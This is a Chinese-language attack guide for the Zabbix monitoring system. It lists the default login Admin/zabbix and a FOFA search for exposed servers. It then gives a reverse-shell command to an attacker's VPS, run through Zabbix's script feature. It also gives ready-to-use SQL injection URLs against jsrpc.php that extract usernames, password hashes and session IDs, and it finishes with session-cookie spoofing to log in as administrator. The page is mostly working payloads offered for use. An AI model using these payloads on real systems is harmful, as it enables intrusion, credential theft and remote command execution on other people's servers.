## 应用简介

![](logo.png)

Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。

可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用

官方网站：https://www.zabbix.com/cn

默认口令：`Admin/zabbix`

## 相关资产

FOFA

```http
app="ZABBIX-监控系统" 
```

## [弱口令]-后台Getshell

在管理-脚本-创建脚本写入反弹`shell`命令

```bash
bash -i >& /dev/tcp/VPS的IP/6666 0>&1
```

在监测-问题处打开一个主机，然后找到刚刚创建的脚本执行

## SQL注入

```http
2.2.x
3.0.0-3.0.3
```

攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限

**漏洞利用**

在攻击机访问的zabbix的地址后面加上如下url：

```http
/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim
estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi
story.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfil
e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=
17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&
mark_color=1
```

输出结果，若包含：`You have an error in your SQL syntax`;表示漏洞存在

- 获取用户名

```http
jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17
```

- 获取密码

```http
jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17
```

- 获取sessionid

```http
http://IP/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,sessionid,0x7e)%20as%20char),0x7e))%20from%20zabbix.sessions%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17
```

用户名密码及sessionid值都已得到，可以先对密码md5解密，解密成功可直接进入后台。

解密不成功可以用sessionid值进行Cookie欺骗替换zbx_sessionid即可成功以administrator登陆